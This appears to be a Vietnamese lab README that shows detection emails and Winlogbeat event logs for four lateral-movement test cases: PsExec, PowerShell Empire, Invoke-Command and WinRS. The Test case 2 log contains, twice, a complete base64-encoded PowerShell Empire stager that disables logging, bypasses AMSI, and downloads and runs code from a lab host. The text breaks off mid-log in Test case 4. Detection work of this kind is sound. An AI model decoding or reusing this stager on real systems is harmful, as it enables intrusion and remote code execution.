# Kết quả gửi về mail:

## Test case 1: PsExec:
![Test case 1: PsExec](/Images/testcase1_psexec.png)
```
Phat hien su tan cong cua Test case 1 PsExec
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 1 PsExec
-----------------------------------------------------------------------------------
{
    "_id": "Eq7tXXMBqCgffGtQA56k",
    "_index": "winlogbeat-7.7.0-2020.07.17",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-17T17:57:58.257Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "bd555251-2073-432b-8e4f-cfb74a040746",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "code": 7045,
            "created": "2020-07-17T17:58:00.451Z",
            "kind": "event",
            "provider": "Service Control Manager"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "A service was installed in the system.\n\nService Name:  PSEXESVC\nService File Name:  %SystemRoot%\\PSEXESVC.exe\nService Type:  user mode service\nService Start Type:  demand start\nService Account:  LocalSystem",
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "winlog": {
            "api": "wineventlog",
            "channel": "System",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "AccountName": "LocalSystem",
                "ImagePath": "%SystemRoot%\\PSEXESVC.exe",
                "ServiceName": "PSEXESVC",
                "ServiceType": "user mode service",
                "StartType": "demand start"
            },
            "event_id": 7045,
            "keywords": [
                "Classic"
            ],
            "process": {
                "pid": 512,
                "thread": {
                    "id": 1060
                }
            },
            "provider_guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
            "provider_name": "Service Control Manager",
            "record_id": 12841,
            "task": "",
            "user": {
                "domain": "WINSRV2008",
                "identifier": "S-1-5-21-4220747943-3152432350-320651364-1000",
                "name": "sv",
                "type": "User"
            }
        }
    },
    "_type": "_doc",
    "sort": [
        1595008678257
    ]
}
```
## Test case 2: Powershell Empire
* Phần log được ghi lại ở maillog của máy monitor: Nội dung log này bị chặn bởi google
```
Something went wrong... (552, '5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. v3sm20015788pfb.207 - gsmtp')
Phat hien su tan cong cua Test case 2 Powershell
	Tong event: 1


-----------------------------------------------------------------------------------
Test case 2 Powershell
-----------------------------------------------------------------------------------
{
    "_id": "A4YqlnMB9w7dbfuYrmlt", 
    "_index": "winlogbeat-7.7.0-2020.07.28", 
    "_score": null, 
    "_source": {
        "@timestamp": "2020-07-28T16:04:05.000Z", 
        "@version": "1", 
        "agent": {
            "ephemeral_id": "f088444c-d823-497c-9ac9-1df8cd9bbafb", 
            "hostname": "WINSRV", 
            "id": "b002425b-af48-4008-8d0a-9e3014604a59", 
            "type": "winlogbeat", 
            "version": "7.7.0"
        }, 
        "ecs": {
            "version": "1.5.0"
        }, 
        "event": {
            "action": "Engine Lifecycle", 
            "code": 400, 
            "created": "2020-07-28T16:04:05.466Z", 
            "kind": "event", 
            "provider": "PowerShell"
        }, 
        "host": {
            "architecture": "x86_64", 
            "hostname": "WINSRV", 
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01", 
            "ip": [
                "fe80::f072:ce34:86ef:7229", 
                "192.168.255.100", 
                "fe80::5efe:c0a8:ff64", 
                "fe80::100:7f:fffe"
            ], 
            "mac": [
                "00:0c:29:fc:f0:a9", 
                "00:00:00:00:00:00:00:e0", 
                "00:00:00:00:00:00:00:e0"
            ], 
            "name": "WINSRV.winsrv2008.local", 
            "os": {
                "build": "7601.24546", 
                "family": "windows", 
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)", 
                "name": "Windows Server 2008 R2 Datacenter", 
                "platform": "windows", 
                "version": "6.1"
            }
        }, 
        "log": {
            "level": "information"
        }, 
        "message": "Engine state is changed from None to Available. \n\nDetails: \n\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.14409.1018\n\tHostId=c7d6c52b-6b19-4e14-8bce-1d0ca0e8848a\n\tHostApplication=powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAG8ATgAuAE0AQQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAUwBzAGUAbQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkAZQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATABVAGUAKAAkAG4AdQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBMAD0AWwBDAE8ATABsAGUAQwBUAGkAbwBOAFMALgBHAGUAbgBFAFIASQBDAC4ARABJAEMAVABJAE8AbgBhAHIAWQBbAHMAdABSAGkATgBHACwAUwB5AHMAVABFAE0ALgBPAGIAagBlAEMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUAbABzAEUAewBbAFMAYwBSAGkAUABUAEIATABPAGMASwBdAC4AIgBHAEUAdABGAGkARQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBlACgAJABOAHUAbABMACwAKABOAGUAVwAtAE8AQgBqAEUAQwBUACAAQwBvAEwATABFAGMAdABJAE8ATgBzAC4ARwBlAE4AZQBSAEkAQwAuAEgAYQBzAEgAUwBFAHQAWwBTAHQAUgBJAG4ARwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbAB1AEUAKAAkAE4AVQBsAGwALAAkAHQAcgB1AGUAKQB9ADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFMARQBSAFYAaQBjAGUAUABPAEkATgBUAE0AQQBOAGEARwBlAHIAXQA6ADoARQBYAHAAZQBjAHQAMQAwADAAQwBPAE4AdABpAG4AdQBlAD0AMAA7ACQAdwBDAD0ATgBFAFcALQBPAEIAagBFAGMAVAAgAFMAWQBzAFQARQBNAC4ATgBFAFQALgBXAGUAYgBDAGwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAGQAZQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAHgAeQA9AFsAUwBZAHMAdABlAE0ALgBOAEUAVAAuAFcARQBCAFIAZQBRAFUAZQBzAHQAXQA6ADoARABFAGYAYQB1AGwAdABXAEUAYgBQAFIATwB4AFkAOwAkAFcAYwAuAFAAcgBvAHgAWQAuAEMAcgBFAGQARQBuAHQASQBhAEwAcwAgAD0AIABbAFMAeQBTAFQAZQBtAC4ATgBFAFQALgBDAHIAZQBEAGUAbgB0AGkAQQBMAEMAYQBDAEgAZQBdADoAOgBEAGUARgBBAHUAbABUAE4ARQB0AHcAbwBSAEsAQwBSAGUAZABFAE4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAVABFAE0ALgBUAGUAWAB0AC4ARQBuAEMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAEUAUwAoACcATABsAG4ARgBmACsAQwAqAD4AbwAuAG0ANQBUADsASwBxAEUAVgBJAHAAWwBeAF8AdABjAC8ATgBQACgASAB9ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADEAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAFcAQwAuAEgAZQBBAEQARQByAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AEwAWQBTAEsAdwBBAG4AMABLAEkARQB4AEoAMwByAGsAawBIAEQAWABRAG8AQwBLAEoAOQB3AD0AIgApADsAJABEAEEAdABBAD0AJABXAEMALgBEAG8AdwBuAGwATwBhAEQARABBAHQAYQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABhAD0AJABEAGEAdABhAFsANAAuAC4AJABkAEEAdABhAC4AbABFAG4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n\tEngineVersion=5.1.14409.1018\n\tRunspaceId=cb821a74-cd29-4b8e-aa5c-f26712252ded\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=", 
        "tags": [
            "beats_input_codec_plain_applied"
        ], 
        "winlog": {
            "api": "wineventlog", 
            "channel": "Windows PowerShell", 
            "computer_name": "WINSRV.winsrv2008.local", 
            "event_data": {
                "param1": "Available", 
                "param2": "None", 
                "param3": "\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.14409.1018\n\tHostId=c7d6c52b-6b19-4e14-8bce-1d0ca0e8848a\n\tHostApplication=powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAG8ATgAuAE0AQQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAUwBzAGUAbQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkAZQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATABVAGUAKAAkAG4AdQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBMAD0AWwBDAE8ATABsAGUAQwBUAGkAbwBOAFMALgBHAGUAbgBFAFIASQBDAC4ARABJAEMAVABJAE8AbgBhAHIAWQBbAHMAdABSAGkATgBHACwAUwB5AHMAVABFAE0ALgBPAGIAagBlAEMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUAbABzAEUAewBbAFMAYwBSAGkAUABUAEIATABPAGMASwBdAC4AIgBHAEUAdABGAGkARQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBlACgAJABOAHUAbABMACwAKABOAGUAVwAtAE8AQgBqAEUAQwBUACAAQwBvAEwATABFAGMAdABJAE8ATgBzAC4ARwBlAE4AZQBSAEkAQwAuAEgAYQBzAEgAUwBFAHQAWwBTAHQAUgBJAG4ARwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbAB1AEUAKAAkAE4AVQBsAGwALAAkAHQAcgB1AGUAKQB9ADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFMARQBSAFYAaQBjAGUAUABPAEkATgBUAE0AQQBOAGEARwBlAHIAXQA6ADoARQBYAHAAZQBjAHQAMQAwADAAQwBPAE4AdABpAG4AdQBlAD0AMAA7ACQAdwBDAD0ATgBFAFcALQBPAEIAagBFAGMAVAAgAFMAWQBzAFQARQBNAC4ATgBFAFQALgBXAGUAYgBDAGwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAGQAZQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAHgAeQA9AFsAUwBZAHMAdABlAE0ALgBOAEUAVAAuAFcARQBCAFIAZQBRAFUAZQBzAHQAXQA6ADoARABFAGYAYQB1AGwAdABXAEUAYgBQAFIATwB4AFkAOwAkAFcAYwAuAFAAcgBvAHgAWQAuAEMAcgBFAGQARQBuAHQASQBhAEwAcwAgAD0AIABbAFMAeQBTAFQAZQBtAC4ATgBFAFQALgBDAHIAZQBEAGUAbgB0AGkAQQBMAEMAYQBDAEgAZQBdADoAOgBEAGUARgBBAHUAbABUAE4ARQB0AHcAbwBSAEsAQwBSAGUAZABFAE4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAVABFAE0ALgBUAGUAWAB0AC4ARQBuAEMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAEUAUwAoACcATABsAG4ARgBmACsAQwAqAD4AbwAuAG0ANQBUADsASwBxAEUAVgBJAHAAWwBeAF8AdABjAC8ATgBQACgASAB9ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADEAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAFcAQwAuAEgAZQBBAEQARQByAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AEwAWQBTAEsAdwBBAG4AMABLAEkARQB4AEoAMwByAGsAawBIAEQAWABRAG8AQwBLAEoAOQB3AD0AIgApADsAJABEAEEAdABBAD0AJABXAEMALgBEAG8AdwBuAGwATwBhAEQARABBAHQAYQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABhAD0AJABEAGEAdABhAFsANAAuAC4AJABkAEEAdABhAC4AbABFAG4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n\tEngineVersion=5.1.14409.1018\n\tRunspaceId=cb821a74-cd29-4b8e-aa5c-f26712252ded\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="
            }, 
            "event_id": 400, 
            "keywords": [
                "Classic"
            ], 
            "opcode": "Info", 
            "provider_name": "PowerShell", 
            "record_id": 833, 
            "task": "Engine Lifecycle"
        }
    }, 
    "_type": "_doc", 
    "sort": [
        1595952245000
    ]
}

```
* Do đó phần log của tấn công này sẽ không gửi kèm cho quản trị viên.
![Test case 2: Powershell Empire](/Images/testcase2_empire.png)
```
Phat hien su tan cong cua Test case 2 Powershell
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 2 Powershell
-----------------------------------------------------------------------------------
```

## Test case 3: Invoke-Command cmdlet
![Test case 3: Invoke Command Cmdlet](/Images/testcase3_invoke_command_cmdlet.png)
```
Phat hien su tan cong cua Test case 3 Invoke-Command cmdlet
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 3 Invoke-Command cmdlet
-----------------------------------------------------------------------------------
{
    "_id": "rHdDknMBQGGqkhfefMoO",
    "_index": "winlogbeat-7.7.0-2020.07.28",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-28T06:20:51.698Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "d4fb884b-fb62-4938-9918-463239b8cc5d",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "action": "Registry",
            "code": 4656,
            "created": "2020-07-28T06:20:53.465Z",
            "kind": "event",
            "provider": "Microsoft-Windows-Security-Auditing"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
                "build": "7601.24546",
                "family": "windows",
                "kernel": "6.1.7601.24545 (win7sp1_ldr_escrow.200102-1707)",
                "name": "Windows Server 2008 R2 Datacenter",
                "platform": "windows",
                "version": "6.1"
            }
        },
        "log": {
            "level": "information"
        },
        "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4220747943-3152432350-320651364-1000\n\tAccount Name:\t\tsv\n\tAccount Domain:\t\tWINSRV2008\n\tLogon ID:\t\t0x23ecca\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\n\tHandle ID:\t\t0x294\n\nProcess Information:\n\tProcess ID:\t\t0x1278\n\tProcess Name:\t\tC:\\Windows\\System32\\wsmprovhost.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tREAD_CONTROL\n\t\t\t\tQuery key value\n\t\t\t\tEnumerate sub-keys\n\t\t\t\tNotify about changes to keys\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x20019\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0",
        "tags": [
            "beats_input_codec_plain_applied"
        ],
        "winlog": {
            "api": "wineventlog",
            "channel": "Security",
            "computer_name": "WINSRV.winsrv2008.local",
            "event_data": {
                "AccessList": "%%1538\n\t\t\t\t%%4432\n\t\t\t\t%%4435\n\t\t\t\t%%4436\n\t\t\t\t",
                "AccessMask": "0x20019",
                "AccessReason": "-",
                "HandleId": "0x294",
                "ObjectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN",
                "ObjectServer": "Security",
                "ObjectType": "Key",
                "PrivilegeList": "-",
                "ProcessId": "0x1278",
                "ProcessName": "C:\\Windows\\System32\\wsmprovhost.exe",
                "RestrictedSidCount": "0",
                "SubjectDomainName": "WINSRV2008",
                "SubjectLogonId": "0x23ecca",
                "SubjectUserName": "sv",
                "SubjectUserSid": "S-1-5-21-4220747943-3152432350-320651364-1000",
                "TransactionId": "{00000000-0000-0000-0000-000000000000}"
            },
            "event_id": 4656,
            "keywords": [
                "Audit Success"
            ],
            "opcode": "Info",
            "process": {
                "pid": 552,
                "thread": {
                    "id": 568
                }
            },
            "provider_guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}",
            "provider_name": "Microsoft-Windows-Security-Auditing",
            "record_id": 1985985,
            "task": "Registry",
            "version": 1
        }
    },
    "_type": "_doc",
    "sort": [
        1595917251698
    ]
}
```

## Test case 4: WinRS
![Test case 4: WinRS](/Images/testcase4_winrs.png)
```
Phat hien su tan cong cua Test case 4 WinRS
        Tong event: 1

-----------------------------------------------------------------------------------
Test case 4 WinRS
-----------------------------------------------------------------------------------
{
    "_id": "pXYHknMBQGGqkhfeWNmn",
    "_index": "winlogbeat-7.7.0-2020.07.28",
    "_score": null,
    "_source": {
        "@timestamp": "2020-07-28T05:20:13.946Z",
        "@version": "1",
        "agent": {
            "ephemeral_id": "d4fb884b-fb62-4938-9918-463239b8cc5d",
            "hostname": "WINSRV",
            "id": "b002425b-af48-4008-8d0a-9e3014604a59",
            "type": "winlogbeat",
            "version": "7.7.0"
        },
        "ecs": {
            "version": "1.5.0"
        },
        "event": {
            "action": "Process Create (rule: ProcessCreate)",
            "category": "process",
            "code": 1,
            "created": "2020-07-28T05:20:15.497Z",
            "kind": "event",
            "module": "sysmon",
            "provider": "Microsoft-Windows-Sysmon",
            "type": "process_start"
        },
        "hash": {
            "imphash": "6101500e8ba15704009132321204bea0",
            "md5": "2a95058431853af672d1e8ef518bf69c",
            "sha256": "6d8b34a3fd8e9ee61279fdfcde0c3f13071f84eddaa7b385e3c859343bf4703a"
        },
        "host": {
            "architecture": "x86_64",
            "hostname": "WINSRV",
            "id": "f4be2742-f414-4caa-bb87-f4003a376c01",
            "ip": [
                "fe80::f072:ce34:86ef:7229",
                "192.168.255.100",
                "fe80::5efe:c0a8:ff64",
                "fe80::100:7f:fffe"
            ],
            "mac": [
                "00:0c:29:fc:f0:a9",
                "00:00:00:00:00:00:00:e0",
                "00:00:00:00:00:00:00:e0"
            ],
            "name": "WINSRV.winsrv2008.local",
            "os": {
